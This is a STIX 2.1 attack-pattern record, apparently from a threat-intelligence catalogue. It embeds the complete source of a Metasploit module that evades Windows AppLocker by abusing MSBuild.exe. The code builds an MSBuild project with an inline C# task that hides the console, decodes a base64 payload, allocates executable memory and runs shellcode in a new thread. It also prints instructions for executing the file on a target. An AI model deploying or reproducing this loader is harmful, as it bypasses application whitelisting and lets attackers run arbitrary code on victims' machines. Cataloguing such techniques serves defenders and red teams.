{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6d034c0b-bd7f-42c3-a035-6d1ad8bf791c",
    "created": "2024-08-14T16:33:19.195626Z",
    "modified": "2024-08-14T16:33:19.195629Z",
    "name": "Applocker Evasion - MSBuild",
    "description": "( This module will assist you in evading Microsoft Windows Applocker and Software Restriction Policies. This technique utilises the Microsoft signed binary MSBuild.exe to execute user supplied code. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/evasion/windows/applocker_evasion_msbuild.rb",
            "external_id": "applocker_evasion_msbuild.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://attack.mitre.org/techniques/T1127/)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Evasion\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Applocker Evasion - MSBuild',\n      'Description' => %(\n         This module will assist you in evading Microsoft\n         Windows Applocker and Software Restriction Policies.\n         This technique utilises the Microsoft signed binary\n         MSBuild.exe to execute user supplied code.\n       ),\n      'Author'      =>\n        [\n          'Nick Tyrer <@NickTyrer>', # module development\n          'Casey Smith' # msbuild bypass research\n        ],\n      'License'     => 'MSF_LICENSE',\n      'Platform'    => 'win',\n      'Arch'        => [ARCH_X86, ARCH_X64],\n      'Targets'     => [['Microsoft Windows', {}]],\n      'References'  => [['URL', 'https://attack.mitre.org/techniques/T1127/']])\n    )\n\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'Filename for the evasive file (default: msbuild.txt)', 'msbuild.txt'])\n      ]\n    )\n  end\n\n  def build_payload\n    Rex::Text.encode_base64(payload.encoded)\n  end\n\n  def obfu\n    Rex::Text.rand_text_alpha 8\n  end\n\n  def msbuild\n    esc = build_payload\n    mod = [obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu]\n    <<~HEREDOC\n      <Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n      <Target Name=\"#{mod[0]}\">\n      <#{mod[1]} />\n      </Target>\n      <UsingTask\n      TaskName=\"#{mod[1]}\"\n      TaskFactory=\"CodeTaskFactory\"\n      AssemblyFile=\"C:\\\\Windows\\\\Microsoft.Net\\\\Framework\\\\v4.0.30319\\\\Microsoft.Build.Tasks.v4.0.dll\" >\n      <Task>\n      <Code Type=\"Class\" Language=\"cs\">\n      <![CDATA[\n      using System;\n      using System.Runtime.InteropServices;\n      using Microsoft.Build.Framework;\n      using Microsoft.Build.Utilities;\n      public class #{mod[1]} :  Task, ITask\n      {\n      private static Int32 #{mod[2]}=0x1000;\n      private static IntPtr #{mod[3]}=(IntPtr)0x40;\n      private static UInt32 #{mod[4]} = 0xFFFFFFFF;\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);\n      [System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n      static extern bool ShowWindow(IntPtr #{mod[5]}, int nCmdShow);\n      [System.Runtime.InteropServices.DllImport(\"Kernel32\")]\n      private static extern IntPtr GetConsoleWindow();\n      const int #{mod[6]} = 0;\n      public override bool Execute()\n      {\n      IntPtr #{mod[5]};\n      #{mod[5]} = GetConsoleWindow();\n      ShowWindow(#{mod[5]}, #{mod[6]});\n      string #{mod[7]} = \"#{esc}\";\n      byte[] #{mod[8]} = Convert.FromBase64String(#{mod[7]});\n      byte[] #{mod[9]} = #{mod[8]};\n      IntPtr #{mod[10]} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{mod[9]}.Length, #{mod[2]}, #{mod[3]});\n      System.Runtime.InteropServices.Marshal.Copy(#{mod[9]}, 0, #{mod[10]}, #{mod[9]}.Length);\n      IntPtr #{mod[11]} = IntPtr.Zero;\n      WaitForSingleObject(CreateThread(#{mod[11]}, UIntPtr.Zero, #{mod[10]}, #{mod[11]}, 0, ref #{mod[11]}), #{mod[4]});\n      return true;\n      }\n      }\n      ]]>\n      </Code>\n      </Task>\n      </UsingTask>\n      </Project>\n    HEREDOC\n  end\n\n  def file_format_filename(name = '')\n    name.empty? ? @fname : @fname = name\n  end\n\n  def create_files\n    f1 = datastore['FILENAME'].empty? ? 'msbuild.txt' : datastore['FILENAME']\n    f1 << '.txt' unless f1.downcase.end_with?('.txt')\n    file1 = msbuild\n    file_format_filename(f1)\n    file_create(file1)\n  end\n\n  def instructions\n    print_status \"Copy #{datastore['FILENAME']} to the target\"\n    if payload.arch.first == ARCH_X86\n      print_status \"Execute using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework\\\\[.NET Version]\\\\MSBuild.exe #{datastore['FILENAME']}\"\n    else\n      print_status \"Execute using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework64\\\\[.NET Version]\\\\MSBuild.exe #{datastore['FILENAME']}\"\n    end\n  end\n\n  def run\n    create_files\n    instructions\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}